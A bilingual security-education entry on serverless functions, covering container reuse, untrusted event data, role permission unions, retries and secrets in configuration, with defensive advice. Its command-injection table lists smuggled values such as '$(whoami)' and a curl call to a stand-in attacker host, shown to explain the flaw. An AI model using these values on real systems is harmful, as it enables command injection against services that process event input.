---
id: cloud-serverless
title_en: Serverless Functions
title_zh: 无服务器函数
summary_en: A machine replaced by a call, which means there is no long-lived process to hold state, one role serves several event sources, and an invocation can be retried. Measured on a small runtime built for the purpose — a token written by one request read by the next in the same container, three event sources reaching the union of one role's permissions, and a retry that sent the same mail twice.
summary_zh: 一台机器被换成了"一次调用"，这意味着没有长期存在的进程可以放状态、一个角色要服务好几种事件源、而且一次调用可能被重试。这一篇在一个为此搭起来的小运行时上实测 —— 一次请求写下的令牌被同一容器里的下一次请求读到、三种事件源都能到达同一个角色的权限并集、以及一次把同一封邮件发了两遍的重试。
tags: [beginner, cloud, serverless, functions, events]
tools: [aws, gcloud, az, python3]
attck: [T1190, T1078]
platform: [cloud]
difficulty: beginner
updated: 2026-10-08
---

<!-- lang:en -->
### A call instead of a machine

Everything about running code changed when the unit stopped being a machine and started being a call. The four consequences that matter here are not about scaling or cost.

> **There is no long-lived process, so there is nowhere to keep state. There is one role per function, and several event sources. An invocation can be retried. And the configuration is environment variables.**

Each of those is measured below on a small runtime built for the purpose, with containers that are reused the way a real platform reuses them.

### Part 1: the shape of it

| Element | What it is |
|---|---|
| the unit | a **function**, deployed as a package or an image |
| what starts it | an **event source** — an HTTP request, a queue, a schedule, a change |
| its identity | a **role**, attached to the function |
| its state | **nothing persistent**, except a temporary filesystem per container |
| its configuration | environment variables, and layers it shares |
| its limits | a timeout, a memory allocation, a concurrency cap |

**And the runtime's job is to be fast**, which is where the first measurement comes from: keeping a container warm is much cheaper than starting one, so **containers are reused** — and a reused container is an environment that has already been used.

**The mental model that avoids most of the mistakes in this entry**: a function is not a program that runs; it is a **piece of code that a platform will invoke with a body of data it did not write, on a role you chose, possibly more than once, in a container that has already handled something else**.

### Part 2: an invocation is not a clean environment

Measured, two requests handled by the same container, where the first writes a lookup result to the temporary filesystem:

| Request | What it read from the temporary filesystem |
|---|---|
| first | nothing there |
| **second, same container** | **a file containing the first request's session token** |
| third, a different container | nothing there |

**The second request read the first request's data**, because the container was reused and the temporary filesystem belongs to the container rather than to the call.

> **The isolation boundary is the container, not the request — and containers are reused, so anything written to the temporary filesystem or to a module-level variable is something a later request may read.**

**Which has a benign reading and a dangerous one, and the same code exhibits both.** Caching a lookup in memory or on disk is correct when two requests genuinely want the same answer and wrong when the answer depends on who asked. **A cache keyed by nothing is a disclosure waiting for a second request.**

**And the reuse is not the code's decision.** Measured, the same tenant's requests landed on the same container while different tenants did not — but that is the platform's scheduling, not a guarantee in either direction. **The only thing the code controls is whether it assumes a clean environment, and the safe assumption is that it does not have one.**

### Part 3: the event object is input

An event arrives looking like an internal message, and it is a body of data written by whoever can trigger the source. Measured, a field taken from the event and used to build a downstream command:

| Field value in the event | Command that was built |
|---|---|
| `report-2026` | `report --name report-2026` |
| **`x; id`** | `report --name x; id` |
| **`$(whoami)`** | `report --name $(whoami)` |
| **`a && curl http://attacker/`** | `report --name a && curl http://attacker/` |

**The event contents became part of the command**, which is the same injection measured in the entries on command execution and templates, arriving through a door that feels internal.

> **"Event" describes the transport, not the trust. Anything that can publish to the source is writing the fields.**

**And the sources are easier to publish to than they look.** A queue another service writes to, a bucket that accepts uploads, a schedule someone can create — **each is a way to choose the contents of an event**, and the function's code is the thing that decides what those contents are allowed to do.

### Part 4: one role, several event sources

A function is bound to one role, and it is usually invoked by more than one kind of event. Measured, a function handling three sources and the permissions each actually needs:

| Event source | Permissions that source uses |
|---|---|
| an HTTP request | `s3:GetObject` |
| a queue | `dynamodb:PutItem`, `ses:SendEmail` |
| a configuration change | `secretsmanager:GetSecretValue` |

**And the role carries the union of all four**: `dynamodb:PutItem`, `s3:GetObject`, `ses:SendEmail`, `secretsmanager:GetSecretValue`.

**So a permission needed by a scheduled job is also held by whatever handles an HTTP request**, and a function whose role can read every secret in the account holds that permission on **every** path that can invoke it.

> **A role is granted per function, not per event type. So any path that can trigger the function reaches the whole role.**

**Which makes the function the permission boundary, and makes "how many ways can this be invoked" the question that decides the blast radius.** The answers that reduce it are structural rather than incidental: **split the function so each source gets its own role**, or narrow the role with a condition on where the event came from — the same mechanism the entry on cloud identity measured for a service trusted without a source condition.

### Part 5: retries are part of the design

An asynchronous invocation that fails is retried, so an event can be processed more than once. Measured, a handler that sends a mail and then fails:

| What happened | Mails sent |
|---|---|
| the side effect completed, then the invocation failed, then the retry succeeded | **2** |
| the same, with an idempotency key checked before acting | **1 — the second attempt returned "already processed"** |

**The first row is the ordinary case and not an error**: the runtime retried because the invocation failed, and the invocation failed *after* doing its work. **A timeout, a crash on the next line, a network error on the final call — all of them produce a retry of work that already happened.**

> **"The same event processed twice" is normal here, so idempotency is not an option; it is the premise.**

**And the fix is the one measured in the entry on webhooks**: an identifier carried by the event, checked before the effect and recorded by it. **The identifier has to come from the event rather than from the attempt**, or the retry arrives with a new one.

**And retries amplify.** An unhealthy downstream makes invocations fail, which makes the runtime retry, which adds load to the thing that was already unwell. **Which is why the retry policy and the dead-letter behaviour are part of the same decision as the concurrency limit.**

### Part 6: the configuration is part of the attack surface

Measured, the environment the function reads:

```
DB_HOST    = prod-db.internal
API_KEY    = sk_live_this-is-in-the-config
STAGE      = prod
```

**Which makes the visibility of the configuration the visibility of the secret.** Anyone who can read the function's settings can read those values, and a piece of code that dumps its environment into a log or an error message writes them to every place the logs go — the same measurement as the entry on keys, with a different place to look.

**And a configuration change needs no deployment.** The value can be changed while the code stays the same, which is convenient and means **the review has to cover settings as changes**, not only commits: a value that becomes a hostname, a flag that switches a verification off, a URL that a function fetches.

**So secrets belong in a secret store the role can read** rather than in the configuration, and the difference is not only who can see it: **a secret read at run time is rotatable without a deployment, and a secret in the configuration is a copy in every environment that has ever been deployed.**

### Part 7: cold starts, timeouts and concurrency

**A cold start is the price of not keeping a process**, and it has a security consequence that is easy to miss: warm containers exist to avoid it, and **a warm container is one that has already run something** — which is precisely the state measured in Part 2.

**A timeout is a limit on the invocation, not a cancellation of its effects.** The invocation is stopped; whatever it already did stands, and the retry does it again. **Which is why "it timed out" is not the same as "it did not happen"**, and why the idempotency key has to be recorded as part of the effect rather than after it.

**And concurrency is a client-side capability.** A function can run in many containers at once, so **an application built on functions is a client that can grow to its cap in seconds** — against a downstream database, an internal API or a third-party service that was sized for something more gradual. **The concurrency limit is that application's rate limit on its own egress**, which is the same conclusion the entry on gateways reached about limits being needed on the way out as well as in.

**And memory is usually also CPU.** The allocation chosen for the function decides its share of processor as well as its space, which makes a size chosen for cost a decision about how fast a password hash or a signature check runs.

### Part 8: what follows for security

**Treat a function as something that can be triggered by anyone who can reach a source, holds a fixed identity, and may run more than once.** Those three properties are measured above and each one has a control that follows directly: **narrow the role to the source**, **validate the event as input**, and **make the effect idempotent**.

**The measured container reuse is the one that surprises people most**, because it means the failure is not in the code's logic but in its assumption. A token cached in a module-level dictionary, a temporary file written with a predictable name, a client object configured with one request's credentials — **all of them are correct within one invocation and wrong across two**, and the second invocation is not an error condition.

**And the event-object injection is the same class as every other injection in this series**, with the aggravating factor that the word "event" implies internal traffic. **The control is unchanged**: values are values, and building a command by concatenation is building a command by concatenation.

**The one-role-many-sources structure is the permission measurement**, and it is worth redoing for any function: **list the sources, list what each needs, and compare that to what the role has**. The union is what an attacker gets from the weakest of the entry points.

**And the configuration is a change surface that does not appear in a code review.** A value can be edited in place, which means a deployment control that only watches code is watching half of what can change behaviour.

**And the egress question matters more here than on a machine**, because a function has no fixed network position to reason about: what it can reach is decided by its role, its subnet and whatever egress controls are in place — **and the entry on instance metadata applies to whatever the function's environment provides**, which on a managed platform is an endpoint of its own.

### Detection and mitigation

- **Report functions whose role carries permissions no source needs**, since the measured union is what the weakest entry point obtains.
- **Alert on configuration changes to functions**, because they change behaviour without a deployment and are invisible to a review that only reads code.
- **Scan function configuration and code for values that look like credentials**, and treat one found in the environment as a credential to rotate rather than a setting to move.
- **Alert on invocation rates or error rates that spike**, since retries amplify an unhealthy downstream and the function is a client that can scale.
- **Watch for the same event identifier being processed more than once**, which is either a retry — expected — or a replay.
- **Review functions that cache anything across invocations**, because the measured reuse makes a cache a potential disclosure rather than only a performance feature.
- **For mitigation, split a function by event source so each has its own role**, and narrow the role with a condition on the source where splitting is impractical.
- **Validate the event object as untrusted input**, with the same care as a request body, and never build a command or a query by concatenation from its fields.
- **Record the idempotency key as part of the effect**, not after it, so a retry after a timeout is recognised as a repeat.
- **Keep secrets in a secret store rather than in configuration**, and let the function's role read them so that rotation does not require a deployment.
- **Assume the temporary filesystem is shared and may contain somebody else's data**, and do not write anything there that the next request should not read.
- **Set the concurrency limit as an egress policy for the downstreams**, since that limit is the only rate the function's own clients will ever apply.
- **And enumerate the ways a function can be invoked.** The measured permissions are the union of its sources, so the list of sources is the list of ways in.

<!-- lang:zh -->
### 一次调用，而不是一台机器

当单位从"一台机器"变成"一次调用"时，关于运行代码的一切都变了。这一篇真正要紧的四个后果与伸缩和成本无关。

> **没有长期存在的进程，所以没地方放状态。一个函数一个角色，而事件源有好几种。一次调用可能被重试。而配置就是环境变量。**

下面每一条都在一个为此搭起来的小运行时上实测，容器按真实平台的方式被复用。

### 第一部分：它的形状

| 元素 | 它是什么 |
|---|---|
| 单位 | 一个**函数**，以包或镜像的形式部署 |
| 谁启动它 | 一个**事件源** —— 一次 HTTP 请求、一个队列、一个定时、一次变更 |
| 它的身份 | 一个**角色**，挂在函数上 |
| 它的状态 | **没有持久的东西**，除了每个容器一份临时文件系统 |
| 它的配置 | 环境变量，以及它共用的层 |
| 它的限制 | 一个超时、一份内存、一个并发上限 |

**而运行时的职责是快**，第一条实测就从这里来：让一个容器保持温热，比启动一个新的便宜得多，所以**容器会被复用** —— 而一个被复用的容器，是一个已经被用过的环境。

**避免这一篇里大部分错误的那个心智模型**：一个函数不是一个"运行着的程序"；它是**一段平台会用一份不是它写的数据、在一个你选的角色上、可能不止一次地、在一个已经处理过别的东西的容器里调用的代码**。

### 第二部分：一次调用不是一个干净的环境

实测，两个请求由同一个容器处理，其中第一个往临时文件系统里写了一份查询结果：

| 请求 | 它从临时文件系统里读到什么 |
|---|---|
| 第一个 | 那里什么都没有 |
| **第二个，同一个容器** | **一个文件，里面是第一个请求的会话令牌** |
| 第三个，另一个容器 | 那里什么都没有 |

**第二个请求读到了第一个请求的数据**，因为容器被复用了，而那份临时文件系统属于容器、不属于这一次调用。

> **隔离的边界是容器，不是请求 —— 而容器会被复用，所以任何写进临时文件系统、或者写进模块级变量的东西，都是之后某个请求可能读到的东西。**

**这有一个良性的读法、一个危险的读法，而同一段代码同时具备两者。** 把一次查询缓存进内存或磁盘，当两个请求确实想要同一个答案时是对的，而当答案取决于"是谁在问"时是错的。**一个没有键的缓存，是一次等着第二个请求到来的泄露。**

**而复用不是代码的决定。** 实测，同一个租户的请求落到了同一个容器，不同租户没有 —— 但那是平台的调度，两个方向都不是保证。**代码唯一能控制的是它是否假定了一个干净的环境，而安全的假定是：它没有。**

### 第三部分：事件对象是输入

一个事件到达时看起来像一条内部消息，而它是一份由"任何能触发那个源的人"写下的数据。实测，把事件里的一个字段拿去构造下游命令：

| 事件里的字段值 | 构造出来的命令 |
|---|---|
| `report-2026` | `report --name report-2026` |
| **`x; id`** | `report --name x; id` |
| **`$(whoami)`** | `report --name $(whoami)` |
| **`a && curl http://attacker/`** | `report --name a && curl http://attacker/` |

**事件的内容成了命令的一部分**，这与讲命令执行与模板那几篇里实测到的注入是同一个，只是从一扇"感觉像内部"的门进来。

> **"事件"描述的是传输方式，不是信任。任何能往那个源里发布的人，都在写那些字段。**

**而那些源比看起来更容易发布。** 另一个服务写入的队列、一个接受上传的桶、一个有人能创建的定时任务 —— **每一样都是一种"选择事件内容"的方式**，而函数里的代码才是决定那些内容被允许做什么的东西。

### 第四部分：一个角色，好几种事件源

一个函数绑定一个角色，而它通常会被不止一种事件调用。实测，一个处理三种源的函数，以及每种源实际需要的权限：

| 事件源 | 那个源用到的权限 |
|---|---|
| 一次 HTTP 请求 | `s3:GetObject` |
| 一个队列 | `dynamodb:PutItem`、`ses:SendEmail` |
| 一次配置变更 | `secretsmanager:GetSecretValue` |

**而角色带着这四条的并集**：`dynamodb:PutItem`、`s3:GetObject`、`ses:SendEmail`、`secretsmanager:GetSecretValue`。

**所以一个定时任务需要的权限，也被处理 HTTP 请求的那条路持有**；而一个能读取账号里每一个秘密的角色的函数，在**每一条**能调用它的路径上都持有那份权限。

> **角色是按函数授予的，不是按事件类型授予的。所以任何能触发这个函数的路径，都能到达整个角色。**

**这就让函数成为权限边界，也让"这个函数有多少种触发方式"成为决定波及范围的那个问题。** 缩小它的答案是结构性的、而不是附带的：**把函数拆开，让每个源有自己的角色**，或者在拆分不现实的地方，用一条关于"事件来自哪里"的条件来收窄角色 —— 与云身份那一篇实测的"信任一个没有来源条件的服务"是同一个机制。

### 第五部分：重试是设计的一部分

一次失败的异步调用会被重试，所以一个事件可能被处理不止一次。实测，一个发完邮件然后失败的处理函数：

| 发生了什么 | 发出的邮件 |
|---|---|
| 副作用完成了、然后这次调用失败、然后重试成功 | **2 封** |
| 同上，但在行动之前检查一个幂等键 | **1 封 —— 第二次尝试返回"已经处理过"** |

**第一行是普通情况、不是错误**：运行时因为这次调用失败而重试，而这次调用**在完成工作之后**失败。**一次超时、下一行代码的崩溃、最后一次网络调用的错误 —— 它们全都产出一次"对已经发生过的工作"的重试。**

> **"同一个事件被处理两次"在这里是正常的，所以幂等不是一个选项，而是前提。**

**而修法就是 webhook 那一篇实测过的那个**：一个由事件携带的标识，在产生效果之前检查、并由那次效果记录下来。**那个标识必须来自事件、而不是来自这次尝试**，否则重试会带着一个新的来。

**而重试会放大。** 一个不健康的下游让调用失败，失败让运行时重试，重试又给那个本来就难受的东西加压。**这就是为什么重试策略与死信行为，与并发上限是同一个决定。**

### 第六部分：配置是攻击面的一部分

实测，函数读到的环境：

```
DB_HOST    = prod-db.internal
API_KEY    = sk_live_this-is-in-the-config
STAGE      = prod
```

**这就让配置的可见性成为秘密的可见性。** 任何能读函数设置的人都能读到那些值，而一段把自己的环境打进日志或者错误信息的代码，会把它们写到日志去的每一个地方 —— 与讲密钥那一篇同一个实测，只是要看的地方不同。

**而一次配置变更不需要部署。** 值可以在代码不变的情况下被改掉，这很方便，也意味着**评审必须把设置当成变更来覆盖**，而不只是提交：一个变成了主机名的值、一个把某项校验关掉的开关、一个函数会去取它的 URL。

**所以秘密应该放在角色能读的密钥服务里**，而不是放在配置里；而两者的差别不只是"谁能看见"：**一个在运行时读来的秘密可以不部署就轮换，而一个放在配置里的秘密，是它被部署过的每一个环境里的一份拷贝。**

### 第七部分：冷启动、超时与并发

**冷启动是不长期保留进程的代价**，而它有一个容易漏掉的安全后果：温热的容器是为了避开它而存在的，而**一个温热的容器就是已经运行过东西的那一个** —— 那正是第二部分实测到的状态。

**超时是对这次调用的限制，不是对它效果的取消。** 调用被停住；它已经做过的事照样成立，而重试会再做一遍。**这就是为什么"它超时了"不等于"它没有发生"**，也是为什么幂等键必须作为那次效果的一部分被记录、而不是在它之后。

**而并发是一种客户端能力。** 一个函数可以同时在很多容器里运行，所以**一个建立在函数之上的应用，是一个能在几秒内长到上限的客户端** —— 面对着那些按更平缓的规模准备的数据库、内部 API 或第三方服务。**并发上限就是这个应用对自己出网的限速**，与网关那一篇得出的"出方向也需要限制"是同一个结论。

**而内存通常也是 CPU。** 为函数选的那份配额决定了它的处理器份额、也决定了它的空间，这就让一个为了成本而选的大小，成为一个关于"口令哈希或者签名校验跑多快"的决定。

### 第八部分：从这些机制推出的安全观念

**把一个函数当成"任何能到达某个源的人都能触发、持有一个固定身份、而且可能运行不止一次"的东西。** 上面三条性质都实测过，而每一条都直接跟着一个控制：**把角色收窄到那个源**、**把事件当输入校验**、以及**让效果幂等**。

**实测到的容器复用是最让人意外的那一条**，因为它意味着失败不在代码的逻辑里、而在它的假定里。一个存在模块级字典里的令牌、一个用可预测名字写下的临时文件、一个用某个请求的凭据配置出来的客户端对象 —— **它们在一次调用之内都是对的，跨两次调用都是错的**，而第二次调用不是一个错误状态。

**而事件对象注入与这个系列里其他每一种注入是同一类**，只是有一个加重因素：**"事件"这个词暗示了内部流量**。**控制手段没有变**：值是值，用拼接构造命令就是用拼接构造命令。

**一个角色多种源这个结构就是那份权限实测**，而它对任何函数都值得重做一遍：**列出源、列出每个源需要什么、再把这个和角色拥有的比一比**。那个并集，就是攻击者从最弱的那个入口得到的东西。

**而配置是一个不会出现在代码评审里的变更面。** 一个值可以就地被改掉，这意味着一个只盯代码的部署控制，只盯住了"能改变行为的东西"的一半。

**而出网这个问题在这里比在一台机器上更要紧**，因为函数没有一个固定的网络位置可以推理：它能到达什么，由它的角色、它的子网、以及任何出网控制决定 —— **而实例元数据那一篇适用于这个函数所在环境提供的一切**，在一个托管平台上那是它自己的一个端点。

### 检测与缓解

- **报出"角色带着没有任何源需要的权限"的函数**，因为实测那个并集就是最弱入口所能得到的东西。
- **对函数的配置变更告警**，因为它们不经过部署就改变行为，而对一个只读代码的评审是不可见的。
- **扫函数配置与代码里像凭据的值**，并把在环境里发现的一个当成要轮换的凭据，而不是一处要挪走的设置。
- **对调用量或错误率的尖峰告警**，因为重试会放大一个不健康的下游，而函数是一个能伸缩的客户端。
- **盯"同一个事件标识被处理不止一次"**，它要么是一次重试 —— 预期之内 —— 要么是一次重放。
- **审"跨调用缓存了任何东西"的函数**，因为实测到的复用让一个缓存成为潜在的泄露、而不只是一个性能特性。
- **缓解上，按事件源把函数拆开，让每个有自己的角色**；在拆分不现实的地方，用一条关于来源的条件收窄角色。
- **把事件对象当不可信输入校验**，与请求体同样的谨慎，并且绝不用它的字段拼接出命令或查询。
- **把幂等键作为那次效果的一部分记录**、而不是在它之后，这样一次超时之后的重试会被认成重复。
- **把秘密放在密钥服务里而不是配置里**，并让函数的角色去读它们，这样轮换不需要部署。
- **假定临时文件系统是共享的、而且可能装着别人的数据**，不要把"下一个请求不该读到"的东西写进去。
- **把并发上限当成对下游的出网策略**，因为那个上限是这个函数自己的客户端唯一会施加的速率。
- **并且把一个函数的所有触发方式列出来。** 实测到的权限是它那些源的并集，所以源的清单就是入口的清单。
